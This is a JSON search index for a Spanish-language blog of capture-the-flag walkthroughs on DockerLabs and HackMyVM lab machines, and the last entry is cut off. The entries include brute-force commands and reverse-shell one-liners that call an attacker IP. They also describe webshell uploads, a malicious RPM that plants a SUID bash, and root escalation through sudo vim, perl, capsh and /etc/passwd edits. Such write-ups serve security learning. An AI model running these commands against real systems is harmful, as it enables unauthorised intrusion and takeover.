[
  
  {
    "title": "Capypenguin , DOCKERLABS",
    "url": "/posts/capypenguin/",
    "categories": "",
    "tags": "",
    "date": "2024-04-25 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sist...",
    "content": "Este es un reto clasificado como de dificultad facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , revisar la web y su codigo , fuerza bruta contra mysql , revisar las bbdd y escaladaHERRAMIENTAS Y RECURSOS USADOS  nmap  ncrack-searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv  172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el ssh 22, el http 80, y el 3306 de mysql.Empecemos por revisar la web no se pq motivo a mi me carga de forma incorrecta y leyendo el codigo veo lo siguiente (eso tambien deberia de verse de forma visual o eso creo).Como se entiende a la perfecion creo que no hace falta explicarlo tenemos al usuario capybarauser y la pass en el final del rockyou  Ademas nos tira un comando a usarYo me voy a llevar las ultimas 100000 lineas del rockyou par empezar con la fuerza bruta y si no seran  1000000 , porque este que tengo lo destripe un par de veces y la cage.tail --lines 100000 ../../../rockyou.txt &gt; 1000.txtAhora ya con el mini rock podemos empezar el ataque , si el usuario lo hubiese extraido de otro lugar haria fuerza bruta tanto a ssh como a mysql pero nos lo ha dado la web asi que vamos primero contra mysql.OJO PARECE QUE SE BLOQUEA LA BASE DE DATOSncrack -u capybarauser -P Maquinas_hack/Dockerlabs.es/capypenguin/1000.txt 172.17.0.2:3306 mysqlInfiltraciónLlego la hora de mandarnos a la base de datos.mysql -h 172.17.0.2 -u capybarauser -pListamos las bases de datosSHOW DATABASES;Le indicamos cual queremos cargar y tambien que nos la muestreUSE pinguinasio_db;SHOW TABLES;Y por ultimo y para visualizar el contenido de la tabla ejecutamosSELECT * FROM users;Ya tenemos un usario y contraseña a probar sshEscalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lSudo nos arroja el binario nano disponible para escalar hasta root.Lo buscamos en searchbins para saber como ejecutarlo y nos hacemos rootNano no se lleva bienLo soluciono cambiando de terminalGracias por leer"
  },
  
  {
    "title": "Nmap basico bien explicado",
    "url": "/posts/Nmap_basico/",
    "categories": "Software",
    "tags": "cft, hacking, etico",
    "date": "2024-04-25 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada...",
    "content": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de ssh por fuerza bruta , movimiento lateral entre usuarios y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  hydra  searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 22 y el 80 abiertos .Empecemos por revisar la web y nos encontramos con una web totalmente en blanco asi que directos a ver la fuente.Empezamos por un ataque de fuerza bruta contra el usario camilo porque contra camilo pq entiendo que el receptor del mail es un usario seguro de la maquina.hydra -l camilo -P rockyou.txt -vV 172.17.02 sshInfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina con el usario y la contraseña proporcionada por hydra.Escalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lComo vemos ninguno de los dos comandos nos arroja luz pero recordemos lo que tenemos hasta ahora la web y los users y la web nos hablaba de juan y un correo a camilo.Momento de buscar el mail.cat /var/mail/camilo.txtAhi tenemos en texto plano la pass de juan , accedamossu juanUna vez como juan volvemos a usar sudo y find y esta vez tenemos positivo con ruby.sudo -lPobre pedro no pasamos por su cuenta , no nos va a dar acceso o si ya eres root.Gracias por leer"
  },
  
  {
    "title": "Upload , DOCKERLABS",
    "url": "/posts/upload/",
    "categories": "",
    "tags": "cft, hacking, etico",
    "date": "2024-04-23 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad muy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al ...",
    "content": "Este es un reto clasificado como de dificultad muy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , subir webshell , reverse shell y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  webshell  searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 80.Empecemos por revisar la web y nos encontramos directamente con una web de subida de archivos y tratamos de subir una webshell.Como vemos hemos podido subir el fichero .php raro que no estuviese filtrado de algun modo , ahora hemos de averiguar como podemos ejecutarlo para ello tendremos que saber el nombre del directorio donde se subio. Yo hoy voy a probar dirsearch pues no todos los programoas tienen los mismos tipos de escaneos u opciones , de paso aprendemos a manejar otros programas.sudo dirsearch -u http://172.17.0.2 -e php,html,txt -w /usr/share/dirbuster/directory-list-2.3-medium.txtInfiltraciónAhora que ya tenemos todo listo es decir , hemos subido el php malicioso y sabemos donde se ha almacedado pasamos a conectarnos a la web para poder mandarnos una revshell.Pononemos netcat como de costumbre antes de nadaEscalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lSudo nos arroja el binario env disponible para escalar hasta root.Lo buscamos en searchbins para saber como ejecutarlo y nos hacemos rootGracias por leer"
  },
  
  {
    "title": "Vacaciones , DOCKERLABS",
    "url": "/posts/vacaciones/",
    "categories": "",
    "tags": "cft, hacking, etico",
    "date": "2024-04-22 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada...",
    "content": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de ssh por fuerza bruta , movimiento lateral entre usuarios y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  hydra  searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 22 y el 80 abiertos .Empecemos por revisar la web y nos encontramos con una web totalmente en blanco asi que directos a ver la fuente.Empezamos por un ataque de fuerza bruta contra el usario camilo porque contra camilo pq entiendo que el receptor del mail es un usario seguro de la maquina.hydra -l camilo -P rockyou.txt -vV 172.17.02 sshInfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina con el usario y la contraseña proporcionada por hydra.Escalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lComo vemos ninguno de los dos comandos nos arroja luz pero recordemos lo que tenemos hasta ahora la web y los users y la web nos hablaba de juan y un correo a camilo.Momento de buscar el mail.cat /var/mail/camilo.txtAhi tenemos en texto plano la pass de juan , accedamossu juanUna vez como juan volvemos a usar sudo y find y esta vez tenemos positivo con ruby.sudo -lPobre pedro no pasamos por su cuenta , no nos va a dar acceso o si ya eres root.Gracias por leer"
  },
  
  {
    "title": "Trust , DOCKERLABS",
    "url": "/posts/trust/",
    "categories": "DockerLabs",
    "tags": "cft, hacking, etico",
    "date": "2024-04-22 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al s...",
    "content": "Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de ssh por fuerza bruta y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  hydra      Enumeracion  Como al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 22 y el 80 abiertos .Empecemos por revisar la web en el puerto que indica y nos encontramos con una web en la que bien claro nos da un posible usuario.Empezamos por un ataque de fuerza bruta contra el usario mario haciendo uso de hydra dado que es mucho mas rapido que nxc.hydra -l mario -P rockyou.txt -vV 172.17.02 sshInfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina con el usario y la contraseña proporcionada por hydra.Escalada de privilegiosUna vez dentro listamos lo primero es ejecutar como de costumbre que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lEl primer comando nos indica que podemos usar sudo así que comprobamos que es lo que nos permite ejecutar con la magia de sudo -l.Como vemos tenemos el procesdor de texto vim que podemos usar como superusuario .Asi que lanzamos el comando final para ser root.Si no recordamos el comando cosultamos GTOFBINS o usuamos la herramienta searchbins que encontrareis en github.sudo vim -c '!/bin/bash'Hasta aqui la maquina trustGracias por leer"
  },
  
  {
    "title": "Domain , DOCKERLABS",
    "url": "/posts/domain/",
    "categories": "",
    "tags": "cft, ,, hacking, ,, etico, ,",
    "date": "2024-04-21 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al s...",
    "content": "Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de samba , subir archivos por samba , envio de revshell y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  enum4linux  netexec  smbmap  smbclientEnumeracionComo al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -n -sV -sC -Pn 172.17.0.2 -oX domain.xmlReporteObservamos el resultado y vemos que solo tiene el 80 , el 139 y 445 abiertos .Despues de revisar la web no encuentro nada asi que tendremos que enumerar samba y intentar extraer los usuarios.Puedes usar herramientas como enum4linux , smbmap , rpclient , metasploit …Vamos a hacer uso de enum4linux el cual nos devuelve datos interesantes , los cuales nos sirven para avanzar como son los recursos compartidos y los usuarios.Ahora probamos a hacer fuerza bruta contra samba dado que conocemos los usuarios hay muchas herrainetas para esto yo me decanto por netexec.Ejecutamos.sudo nxc smb 172.17.0.2 --ignore-pw-decoding -u bob -p /home/quino/rockyou.txty obtenemos la passwordUna vez con la password ejecutamos smbmap para corroborar si hay permisos de escritura en algun directoriosmbmap -u bob -p star -H 172.17.0.InfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina para intentar colar un archivo e intentar ejecutarlo desde la web dado que la carperta de samba es la raiz wwwPara ello utilizare smbclient indicandole el directorio que antes vimos que bob puede escribirsmbclient //172.17.0.2/html -U bobUna vez dentro listamos los archivos y efectivamente encontramos el index.html .Asi que vamos a subir una webshell para reenviarnos un revshell.Accedemos a al php que hemos subido y ejecutamos una revshell , para ello antes nos ponemos en escucha con netcat.Atacantesudo nc -lvnp 443En la webshellbash -c \"bash -i  &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1\"Resultado :Escalada de privilegiosComo siempre empezaremos por lo mas basico buscando ficheros con permisos erroneos scripts con suid gid….En este caso con find tenemos suertefind / -perm -4000 2&gt;/dev/nullComo vemos tenemos el procesdor de texto nano que podemos usar como superusuario asi que solo debemos editar el fichero que creamos mas conveniente para acceder al sitema.El mas rapido y sencillo es editar /etc/passwd y eliminar la x de la linea root de ese moso no se nos pide contraseña cuando hacemos:su rootHasta aqui la maquina domain.Gracias por leer"
  },
  
  {
    "title": "Pyred , DOCKERLABS",
    "url": "/posts/pyred/",
    "categories": "",
    "tags": "",
    "date": "2024-04-19 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al...",
    "content": "Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , envio de revshell y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  Python  Sudo  fpm  https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-1-creating-a-malicious-rpm-packageEmpezamosComo al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , como comprobar la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sSVC -n -Pn -A -vvv 172.17.0.2Observamos el resultado y vemos que solo tiene el puerto 5000 abierto , por lo tanto la entrada esta en esa web asi que vamos a revisarla.El codigo fuente no muestra nada pero por lo que parece es un shell interactivo de python , asi que probamos a ejecutar comandos.print(\"loco\")InfiltraciónComo hemos comprobado si que ejecuta, así que intentamos mandarnos una revshell.Para ello antes de ejecutar la rev nos colocamos a la escucha en la maquina atacante.sudo nc -lvnp 443y en la victima ejecutamos:import osos.system(\"bash -c bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1\")Ya tenemos la revshell y podemos trabajar directamente en el objetivo y pasamos a escalar privilegios.Escalada de privilegiosComo siempre empezaremos por lo mas basico buscando ficheros con permisos erroneos scripts con suid.find / -perm -4000 2&gt;/dev/nullsudo -lEl comando find no devuelve nada aprovechable de momento , pero sudo nos da la idea de como atacar puesto que el usuario primpi puede ejecutar dnf que es un gestor de paquetes de fedora.Podemos usar gtfobins para averiguar como explotar esa vulnerabilidad.Yo tengo instalado searchbins y ejecuto , donde  -b es el binario al que tenemos acceso y -f indica la funcion que utilizaremos para acceder al binario./searchbins.sh -b dnf -f sudoEl searchbins me devuelve lo siguiente:It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.Descargamos e instalamos la herramienta para crear el rpm.TF=$(mktemp -d)echo 'id' &gt; $TF/x.shfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TFDebemos crear un  rpm malicioso en nuestra maquina atacante , lo cual lo podemos hacer con los comandos anteriores y una vez lo tengamos subirlo a la maquina victima e instalarlo.Usaremos los siguientes comandos.En maquina atacante :python3 -m http.serverY el la victima :curl -O http://ipatacante/rpmcreadosudo dnf install -y rpmcreado.rpmYo personalmente no acabo de entender que es lo que hacen exactamente esos comandos así que busque otra forma de hacerlo que fuera mas entendible para mi , así que hice lo siguiente.mkdir exploit_rpmCreo un script en el directorio creado anteriormente con el siguiente contenido.#!/bin/bashcp /bin/bash /tmp/bashchmod +xs /tmp/bashUna vez creado el script hago uso de la herramienta fpm que hemos instalado anteriormente , yo al ser usuario de arch no tengo instalado rpmbuild asi que me lance un VM de kali para realizar esa tarea y ejecute :fpm -n exploit -s dir -t rpm --before-install ./exploit/exploit.sh ./exploitCreated package {:path=&gt;\"exploit-1.0-1.x86_64.rpm\"}Ahora que ya lo tenemos creado solo tendremos que enviarlo a la maquina objetivo y instalarlo y ejecutarlo como explique antes el ultimo comando que utilizo para ser root es :/tmp/bash -pComo observamos ya estamos como superuser.Hasta aqui llegamos , un saliudo y gracias por leer."
  },
  
  {
    "title": "Alzheimer, HACKMYVM",
    "url": "/posts/alzheimer/",
    "categories": "HackMyVM",
    "tags": "",
    "date": "2023-11-27 00:00:00 -0300",
    





    
    "snippet": "En esta maquina encontramos scan , port knoking ,  escalada de privilegios. Como siempre vamos a empezar por localizar la maquina victima y realizar un scan de puertos.Herramientas y recursos web u...",
    "content": "En esta maquina encontramos scan , port knoking ,  escalada de privilegios. Como siempre vamos a empezar por localizar la maquina victima y realizar un scan de puertos.Herramientas y recursos web utilizados  arp-scan  nmap  gtofbinsEscaneoEmpezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.arp-scan -lnmap -A -n $ipvictimaComo podemos observar nos muestra tres puertos el 22 y el 80 estan filtrados y el 21 abierto , así que de momento vamos al ftp ya que permite login anonimo.ftp $ipvictimaUna vez dentro de la ftp vemos que encontramos un archivo interensante y oculto.Vemos su contenido y anotamos las indicaciones asi como el mensaje repetido que es algo raro.” Ihavebeenalwayshere!!! “Nos dice que hay que hacer port knocking  en los puertos especificados , para ello instalamos knock si no lo tenemos lo instalamos y procedemos ha hacer lo que nos indica en los puertos indicados.El firewall abrira los puertos  ,  por lo general cuando se golpean los puertos de determinada manera se desactivan los filtros.knock 192.168.0.101 1000 2000 3000 -v -d 1000En el primer golpeo ya nos abre el 80 ahora falta el 22 asi que seguimos con knocking que lo abre a la tercera llamada.Una vez tengo todos los puerto abiertos me voy a chusmear la web.Vemos que contiene un mensaje firmado por medusa que puede ser usuario ya podriamos tirar con hidra y el rockyou , aunque si analizamos lo que dice es que la pass esta en un txt  y el unico txt hasta el momento era el .secretnote.txt y aparate de las instruciones venia un frase.Directo a sshssh medusa@192.168.0.101ESCALADA DE PRIVILEGIOSPerfecto estamos ya en el usuario.Yo personalmente uso kitty como terminal y me da algunos errores como clear  , tab , etc…. asi que ejecuto :export TERM=xtermEl resto no me molesta asi que tiro para adelanteUna vez dentro como siempre haremos lo mas básico buscar con sudo -l  o binarios suidEl comando sudo -l nos arroja un /bin/id con esa informacion me acerco a gtofbins y no me arroja nada bueno y no tengo de lejos el nivel para averiguar por mi mismo si ese binario serviria para escalar .Ahora toca el plan B del para ello usamos findfind /  -perm /4000 2&gt;/dev/nullDel listado que vemos tambien podriamos usar mount para escalar si este estuviera para ser ejecutado a traves de sudo , el binario en cuestion que usaremos en esta prueba es /usr/bin/capsh vamos a gtofbins para ver como se hace.  Si el binario tiene el bit de SUID establecido, no deja caer los privilegios elevados y puede ser abusado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado como una puerta trasera SUID. Si se usa para correr sh -p, omit the -pargumento en sistemas como Debian (o= Stretch) que permiten el valor predeterminado shpara correr con privilegios SUID.Este ejemplo crea una copia local SUID del binario y la dirige para mantener privilegios elevados. Para interactuar con un binario SUID existente omita el primer comando y ejecutar el programa usando su ruta original.    sudo install -m =xs $(which capsh) .        ./capsh --gid=0 --uid=0 --Una vez ejecutado ya somo root y podemos dedicarmos a buscar las flags o lo que te interese.Muchas gracias por leer."
  },
  
  {
    "title": "Hidden, HACKMYVM",
    "url": "/posts/hidden/",
    "categories": "",
    "tags": "",
    "date": "2023-11-26 00:00:00 -0300",
    





    
    "snippet": "En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shellHerramientas y software utilizado  arp-scan  nmap  gobuster , wfuzz  sudo  python3 http.server  ncrackU...",
    "content": "En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shellHerramientas y software utilizado  arp-scan  nmap  gobuster , wfuzz  sudo  python3 http.server  ncrackUna vez encontrada la maquina realizamos un scan de puertos con nmapComo vemos en este caso solo tenemos el puerto 22 y el 80 asi que primero vamos a ver la web y su codigo fuente.En la web nos encontramos  con una imagen con un codigo extraño y su nombre indica que lo decodifiquemos y mas abajo en un comentario nos indica que ese codigo usa un formato concreto.Nos vamos a la siguiente web https://www.dcode.fr/tic-tac-toe-cipher y buscamos la codificacion correcta para nuestro codigo para poder obtener algo legible.  ¿Cuál es la diferencia entre codificar y cifrar?Los códigos por lo general operan sobre la semántica, significados, mientras que los cifrados operan sobre la sintaxis, símbolos. Un código se almacena como un mapeo en un libro de códigos, mientras que los cifrados transforman símbolos individuales de acuerdo con un algoritmo.Una vez localizado y decodeado lo añadimos a /etc/hosts vamos a la web de nuevo a ver que hay.Como vemos no hay nada util asi que toca hacer fuzzing contra la ruta añadida en etc/hosts para buscar directorios y archivos ocultos.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://sys.hidden.hmv --exclude-length 3690Como vemos nos muestra tres directorios ocultos dos de ellos son para distraernos y uno de ellos nos devuelve una web en blanco.Vamos a hacer fuzzing de nuevo contra ese otro directorio para ver si esconde algo mas.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://sys.hidden.hmv/weapon --exclude-length 3690Nos encuentra un archivo con nombre loot.php al que tenemos acceso pero nos devuelve una web en blanco , me hace pensar que hay una webshell , pero nos faltan datos para hacer uso de ella si es que existe .Esta vez neceitamos encontrar la carga que falta para poder ejecutar comandos y vamos a hacer uso de otro fuzzer en este caso wfuzz para ver si encuentra la carga util que nos faltaria.  Las webshell siempre tienen este fomato:htttp:direccion/archivo.php?loquesea=comandoAl menos por lo que he visto hasta la fecha pero imagino que pueden crearse con otro lenguaje.wfuzz -c -w /usr/share/dirb/wordlists/big.txt  -u http://sys.hidden.hmv/weapon/loot.php\\?FUZZ\\=ls --hw 0Como vemos en la imagen y despues de varias pruebas con otros fuzzers encontro la palabrita que nos da paso a la ejecucion de comandos remota , es momento de mandarnos una reverseshell.Para ello podemos buscar en internet hay varias paginas que te la crean yo uso la siguiente https://www.revshells.com/.Lo primero es poner nuestra maquina a la escucha:nc -lvpn 9001Despues en la webshell ejecutamos:sh -i &gt;&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1Este intento no me conecto ni encodeando la url acto seguido hago lo mismo pero llamando a nc directamente.nc 20192.168.0.112 9001 -e shCon este segundo metodo tampoco me conectaba como esperaba pueden ver el error en la imagen de abajo al igual que la conexion exitosa cuando cambie el sh por un /bin/bash quedando el comando de la siguiente manera.nc 20192.168.0.112 9001 -e /bin/bashSpanw de shellpython3 -c 'import pty;pty.spawn(\"/bin/bash\")'Aqui podemos ver el fichero que creo para verificar que la carga util era la palabra hack que por lo general usan cmd , exec , etc….Ahora como siempre lo primero sera un sudo -l o permisos suid con find para algun binario o script personal.Al hacer un ls sobre el home vemos que hay dos usuario toreto y atenea y el usuario toreto puede ejcutar perl con permisos sudo . Vamos a gtofbins para ver como se hace y poder acceder al sistema de ficheros de toreto conservando sus privilegios.  Recordar que sois www-data hay que indicarle a sudo con el usuario que quereis ejecutar sudo.sudo -u toreto perl -e 'exec \"/bin/bash\" ;'El usuario toreto no tiene nada interesante revisamos el user atenea y encontramos una carpeta oculta con un diccionario de claves , debemos descargarlo y lanzar cualquier software que permita ataque por diccionario.Para ello levanto un servicio web con python en el directoriopython3 -m http.serverDescargamos el diccionario y lanzamos en mi caso ncrackncrack -p 22 --user atenea -P atenea.txt 192.168.0.101Nos logueamos por ssh con el user y la pass y empezmos la escala final como antes con sudo -l.Consultamos gtofbins para ver como se hace la escala con socat.Para variar no olviden buscar las flagsMuchas gracias por leer."
  },
  
  {
    "title": "Twisted, HACKMYVM",
    "url": "/posts/twisted/",
    "categories": "",
    "tags": "",
    "date": "2023-11-25 00:00:00 -0300",
    





    
    "snippet": "En esta maquina encontaremos escaneo  , esteganoigrafia y lectura de binarioHerramientas y recursos utilizados:  arp-scan  nmap  stegseek  https://morsecode.world/international/decoder/audio-decode...",
    "content": "En esta maquina encontaremos escaneo  , esteganoigrafia y lectura de binarioHerramientas y recursos utilizados:  arp-scan  nmap  stegseek  https://morsecode.world/international/decoder/audio-decoder-adaptive.html  radare2  https://reverseengineering.stackexchange.com/questions/15193/radare2-c-output  https://reverseengineering.stackexchange.com/questions/15244/how-to-use-radare2-to-disassemble-an-executable-fileScanUna vez localizada la maquina de la victima realizamos lanzamos a nuestro amigo nmap.Como podemos ver nos encontramos con el puerto 80 y con el servicio ssh corriendo por el puerto 2222.Empezamos como siempre por lo facil observando tanto la web como su codigo fuente , el codigo fuente no tiene nada especial solo nos indica que prefiere la imagen de abajo y como a simple vista son iguales vamos a analizar las dos imagenes.EsteganografiaPrimero le paso exiftool sin exito asi que probamos de nuevo con stegseek el cual nos devuelve un txt.stegseek cat-original.jpg ../../../Descargas/rockyou.txt/rockyou.txtstegseek cat-hidden.jpg ../../../Descargas/rockyou.txt/rockyou.txtTambien estamos atentos a los nombres de los txt originales que nos devuelve stegseek.Yo hago  login con con el user mateo , en su home hay un .wav que es una trampa y perdida de tiempo el mismo nos lo dice.”CON HUMOR”Escalada de privilegiosPara esta parte como de costumbre en estos retos sencillos que me llevan un tiempo ejecutamos:sudo -lfind / -perm /4000 2&gt;/dev/nullCon find vemos que que existe un archivo llamado beroot con suid pero no consigo llegar a ese archivo , tambien hay otra note.txt en el directorio de markus el cual tampoco leer , lo que me lleva pensar que con este usuario estoy en un agujero de conejo por completo.Vuelvo hacia atras para intentar hacer login con markus.Tengo exito con markus y consigo leer el txt que indica lo siguiente clave id_rsa guardada en ….La copiamos a nuestra maquina cambiamos a 600 los permisos y conectamos con ssh al user bonita.ssh -i id_rsa  bonita@192.168.0.108 -p 2222Ejecutamos el binario y nos da error , aqui busque un manual de la maquina para ver que hacer porque ni puta idea en algun walktrough te ponen el codigo que se necesita pero hay que hacerlo por uno mismo con copy paste no aprendes y como he visto que  todos hacen uso de ghidra “NSA” me decante por radare2 pese a no tener ni idea de como usarlo.El que quiera ver porno , subir tik toks y demas adormecimientos que lo haga es libre, pero internet es la puta biblioteca de Alejandria y pocas cosas hay que no se puedan encontrar y aprender.Levantamos un servidor http con python3  y descargamos el fichero.python3 -m http.serverNos abrimos radare2 y ejecutamos lo siguiente:  s main  que nos llevara a la funcion principal que todo programa en c tienepd   que nos mostrara el codigo decompiladobuscamos la parte donde espera un input  “scanf” en c o buscamos la cadena de texto que nos muestra cuando lo ejecutamos cerca de esa parte esta el valor que buscamos.Obvio que hay maneras de hacer que sea mas legible pero repito es mi primera vez y no encontre la forma de hacerlo mas legible como lo hacen los que usan ghidra.La funcion cmp compara el valor introducido con el que esta escrito dentro de esa funcion.Ahora solo nos queda ir a alguna web a convertir el hexadecimal en decimal para obtener el codigo de beroot que nos dara acceso a root.INFO RADARE2  [0x00005430]&gt; pd?|Usage: p[dD][ajbrfils] [sz] [arch] [bits] # Print Disassembly| NOTE: len  parameter can be negative| NOTE:      Pressing ENTER on empty command will repeat last pd command and also seek to end of disassembled range.| pd N       disassemble N instructions| pd -N      disassemble N instructions backward| pD N       disassemble N bytes| pda        disassemble all possible opcodes (byte per byte)| pdb        disassemble basic block| pdc        pseudo disassembler output in C-like syntax| pdC        show comments found in N instructions| pdk        disassemble all methods of a class| pdj        disassemble to json| pdr        recursive disassemble across the function graph| pdf        disassemble function| pdi        like ‘pi’, with offset and bytes| pdl        show instruction sizes| pds[?]     disassemble summary (strings, calls, jumps, refs) (see pdsf and pdfs)| pdt        disassemble the debugger traces (see atd)  The pc command will output n bytes from the current seek (s) as a C array, where n is the Block size (b) or the length mentioned in the command.The output is then can be used to, for example, manipulate the array outside of radare2, build a shellcode, decrypt a buffer and so on.Let’s demonstrate it with a simple example.Here’s a tiny HelloWorld.c program:```c#include  void main(){        printf(“Hello, World!\\n”);}&gt;Let's compile it with `gcc HelloWorld.c -o HelloWorld` and open it with radare2 `r2 -A HelloWorld`Now let's seek to `main` and print the function:```c[0x00400400]&gt; s main[0x004004d7]&gt; pdf            ;-- main:/ (fcn) sym.main 17|  sym.main ();|           ; DATA XREF from 0x0040041d (entry0)|       0x004004d7      55             push rbp|       0x004004d8      4889e5         mov rbp, rsp|       0x004004db      bf74054000     mov edi, str.Hello__World_ ; \"Hello, World!\"|       0x004004e0      e80bffffff     call sym.imp.puts          ; int puts(const char *s)|       0x004004e5      90             nop|       0x004004e6      5d             pop rbp\\       0x004004e7      c3             retDe facil para mi nada esta maquina pero aprenderemos los principios para decompilar y saltarnos la seguridad de algun software.Benditos agujeros de conejo y no soy Alicia en el pais de las maravillas, pese a las complicaciones muy recomendada esta maquina y divertida si no sabes mucho y te gusta romperte los cuernos dale a esta.GRACIAS POR LEER… ACUERDENSE DE LAS FLAGS"
  },
  
  {
    "title": "Method, HACKMYVM",
    "url": "/posts/method/",
    "categories": "",
    "tags": "",
    "date": "2023-11-16 00:00:00 -0300",
    





    
    "snippet": "En esta maquina en teoría sencilla nos encontramos los siguientes  retos y complicaciones  Averiguar ip victima.  Enumeracion  Remote code execution  Escalada de privelegiosHerramientes usadas:  ar...",
